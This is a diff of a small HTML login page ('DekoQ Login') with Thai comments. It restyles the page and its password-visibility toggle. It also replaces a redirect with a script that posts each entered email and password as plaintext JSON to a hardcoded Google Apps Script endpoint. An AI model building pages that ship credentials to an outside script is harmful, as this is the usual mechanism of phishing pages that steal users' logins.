@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>DekoQ Login</title>
   <style>
     * {
@@ -13,7 +13,7 @@
       margin: 0;
       padding: 0;
       background: linear-gradient(135deg, #007BFF, #0056b3);
-      font-family: Arial, sans-serif;
+      font-family: 'Arial', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -42,7 +42,7 @@
       padding: 2rem;
       border-radius: 12px;
       box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-      width: 100%;
+      width: 90%;
       max-width: 400px;
     }
 
@@ -53,42 +53,47 @@
 
     label {
       font-weight: bold;
+      margin-bottom: 0.3rem;
       color: #000;
       text-align: left;
-      margin-bottom: 0.3rem;
-    }
-
-    .input-wrapper {
-      position: relative;
-      width: 100%;
-      margin-bottom: 1.2rem;
     }
 
     input[type="email"],
     input[type="password"] {
-      width: 100%;
-      padding: 0.8rem 2.5rem 0.8rem 1rem;
+      font-size: 1rem;
+      padding: 0.8rem 1.2rem;
       border: 1px solid #ccc;
       border-radius: 8px;
-      font-size: 1rem;
-      transition: none;
+      margin-bottom: 1.2rem;
+      width: 100%;
     }
 
-    .eye-icon {
+    .password-wrapper {
+      position: relative;
+      width: 100%;
+    }
+
+    .password-wrapper input {
+      padding-right: 40px; /* เพื่อเผื่อที่ให้ไอคอน */
+    }
+
+    .toggle-password {
       position: absolute;
-      right: 10px;
       top: 50%;
+      right: 12px;
       transform: translateY(-50%);
       background: none;
       border: none;
-      padding: 0;
       cursor: pointer;
+      padding: 0;
+      width: 24px;
+      height: 24px;
     }
 
-    .eye-icon svg {
-      width: 20px;
-      height: 20px;
-      fill: #FFD700;
+    .toggle-password svg {
+      width: 24px;
+      height: 24px;
+      fill: #FFC107; /* สีเหลือง */
     }
 
     button[type="submit"] {
@@ -97,14 +102,10 @@
       background: #222;
       color: white;
       border: none;
-      font-size: 1rem;
       font-weight: bold;
-      border-radius: 8px;
       cursor: pointer;
-    }
-
-    button[type="submit"]:hover {
-      background: #000;
+      font-size: 1rem;
+      border-radius: 8px;
     }
   </style>
 </head>
@@ -115,45 +116,67 @@
       <p>Welcome!</p>
     </div>
     <div class="login-box">
-      <form id="loginForm">
-        <label for="email">Username / Email</label>
-        <div class="input-wrapper">
-          <input type="email" id="email" name="email" required placeholder="Enter email" />
-        </div>
+      <form id="form">
+        <label for="email">Username/Email</label>
+        <input type="email" id="email" name="email" required placeholder="Enter your email" />
 
         <label for="password">Password</label>
-        <div class="input-wrapper">
-          <input type="password" id="password" name="password" required placeholder="Enter password" />
-          <button type="button" class="eye-icon" onclick="togglePassword()" aria-label="toggle password">
-            <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-              <path d="M12 4.5C7.305 4.5 3.221 7.389 1.5 12c1.721 4.611 5.805 7.5 10.5 7.5s8.779-2.889 10.5-7.5C20.779 7.389 16.695 4.5 12 4.5zm0 12.75c-2.9 0-5.25-2.35-5.25-5.25S9.1 6.75 12 6.75s5.25 2.35 5.25 5.25-2.35 5.25-5.25 5.25zm0-9a3.75 3.75 0 100 7.5 3.75 3.75 0 000-7.5z"/>
+        <div class="password-wrapper">
+          <input type="password" id="password" name="password" required placeholder="Enter your password" />
+          <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Toggle password visibility">
+            <!-- SVG ตาเปิด -->
+            <svg id="eye-open" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+              <path d="M12 4.5C7 4.5 2.7 8 1 12c1.7 4 6 7.5 11 7.5s9.3-3.5 11-7.5c-1.7-4-6-7.5-11-7.5zm0 13c-3 0-5.5-2.5-5.5-5.5S9 6.5 12 6.5s5.5 2.5 5.5 5.5-2.5 5.5-5.5 5.5z"/>
+              <circle cx="12" cy="12" r="2"/>
+            </svg>
+            <!-- SVG ตาหลับ -->
+            <svg id="eye-closed" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="display:none">
+              <path d="M1 12s4-6.5 11-6.5S23 12 23 12s-4 6.5-11 6.5S1 12 1 12zm11-2a2 2 0 1 1 0 4 2 2 0 0 1 0-4z"/>
+              <path d="M3 3l18 18" stroke="black" stroke-width="2"/>
             </svg>
           </button>
         </div>
 
-        <button type="submit">Login</button>
+        <button type="submit">Submit</button>
       </form>
     </div>
   </div>
 
   <script>
+    const form = document.getElementById("form");
     const passwordInput = document.getElementById("password");
-    const eyeIcon = document.getElementById("eyeIcon");
+    const toggleBtn = document.querySelector(".toggle-password");
+    const eyeOpen = document.getElementById("eye-open");
+    const eyeClosed = document.getElementById("eye-closed");
+
+    const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const email = form.email.value;
+      const password = form.password.value;
+
+      fetch(scriptURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password }),
+      })
+      .then(response => {
+        alert("ส่งข้อมูลสำเร็จแล้ว!");
+        form.reset();
+      })
+      .catch(error => {
+        alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
+        console.error("Error!", error.message);
+      });
+    });
 
     function togglePassword() {
-      const type = passwordInput.type === "password" ? "text" : "password";
-      passwordInput.type = type;
-
-      // เปลี่ยนไอคอนตามสถานะ
-      eyeIcon.innerHTML = type === "password"
-        ? '<path d="M12 4.5C7.305 4.5 3.221 7.389 1.5 12c1.721 4.611 5.805 7.5 10.5 7.5s8.779-2.889 10.5-7.5C20.779 7.389 16.695 4.5 12 4.5zm0 12.75c-2.9 0-5.25-2.35-5.25-5.25S9.1 6.75 12 6.75s5.25 2.35 5.25 5.25-2.35 5.25-5.25 5.25zm0-9a3.75 3.75 0 100 7.5 3.75 3.75 0 000-7.5z"/>'
-        : '<path d="M1.5 12s3.75-6 10.5-6 10.5 6 10.5 6-3.75 6-10.5 6S1.5 12 1.5 12zm10.5 3a3 3 0 110-6 3 3 0 010 6z"/>'
+      const isPassword = passwordInput.type === "password";
+      passwordInput.type = isPassword ? "text" : "password";
+      eyeOpen.style.display = isPassword ? "none" : "inline";
+      eyeClosed.style.display = isPassword ? "inline" : "none";
     }
-
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      window.location.href = "form.html"; // ต่อหน้าแบบฟอร์มถัดไป
-    });
   </script>
 </body>
 </html>
